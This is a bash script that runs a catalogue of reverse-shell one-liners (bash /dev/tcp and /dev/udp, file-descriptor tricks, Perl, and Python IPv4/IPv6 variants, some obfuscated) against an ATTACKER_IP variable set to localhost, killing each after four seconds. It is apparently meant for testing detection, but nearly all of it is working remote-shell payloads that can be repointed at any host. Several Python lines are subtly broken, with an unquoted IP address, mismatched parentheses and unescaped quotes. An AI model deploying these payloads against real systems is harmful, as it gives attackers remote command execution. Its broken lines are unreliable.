#!/bin/bash

ATTACKER_IP="127.0.0.1"
ATTACKER_IPv6="::1"
PORT=4444
PORTv6=4445

run_test () {
    echo -e "\n[*] Running: $1"
    bash -c "$1" &
    PID=$!
    sleep 4
    kill $PID 2>/dev/null
    sleep 1
}

echo "===== CATEGORY 1: Classic Bash TCP shells ====="
run_test "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"
run_test "/bin/bash -l > /dev/tcp/$ATTACKER_IP/$PORT 0<&1 2>&1"

echo "===== CATEGORY 2: FD tricks (dup2 heavy) ====="
run_test "0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/$PORT; sh <&196 >&196 2>&196"
run_test "exec 5<>/dev/tcp/$ATTACKER_IP/$PORT; cat <&5 | while read line; do \$line 2>&5 >&5; done"

echo "===== CATEGORY 3: Bash UDP Shells ====="
run_test "sh -i >& /dev/udp/$ATTACKER_IP/$PORT 0>&1"

echo "===== CATEGORY 4: Perl Shells ====="
run_test "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($PORT,inet_aton($ATTACKER_IP)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

echo "===== CATEGORY 5: Python IPv4 Shells ====="
run_test "export RHOST=$ATTACKER_IP;export RPORT=$PORT;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
run_test "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($ATTACKER_IP,$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"

echo "===== CATEGORY 6: Python IPv4 Subprocess based Shells ====="
run_test "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($ATTACKER_IP,$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
run_test "python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($ATTACKER_IP,$PORT));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"

echo "===== CATEGORY 7: Python IPv4 No Spaces Shells ====="
run_test "python3 -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($ATTACKER_IP,$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
run_test "python3 -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($ATTACKER_IP,$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
run_test "python3 -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($ATTACKER_IP,$PORT));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"

echo "===== CATEGORY 8: Python IPv4 No Spaces and Shortened Shells ====="
run_test "python3 -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(($ATTACKER_IP,$PORT));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"
run_test "python3 -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect($ATTACKER_IP,$PORT));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'"
run_test "python3 -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(($ATTACKER_IP,4444));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"

echo "===== CATEGORY 9: Python IPv4 No Spaces and More Shortened Shells ====="
run_test "python3 -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect(($ATTACKER_IP,$PORT));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"
run_test "python3 -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect(($ATTACKER_IP,$PORT));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'"
run_test "python3 -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect(($ATTACKER_IP,$PORT));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"

echo "===== CATEGORY 10: Python IPv6 Shells ====="
run_test "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(($ATTACKER_IPv6,$PORTv6,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"

echo "===== CATEGORY 11: Python IPv6 with no Spaces Shells ====="
run_test "python3 -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(($ATTACKER_IPv6,$PORTv6,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"

echo "===== CATEGORY 12: Python IPv6 with no Spaces and shortened Shells ====="
run_test "python3 -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(($ATTACKER_IPv6,$PORTv6,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'"

echo -e "\n[+] Done."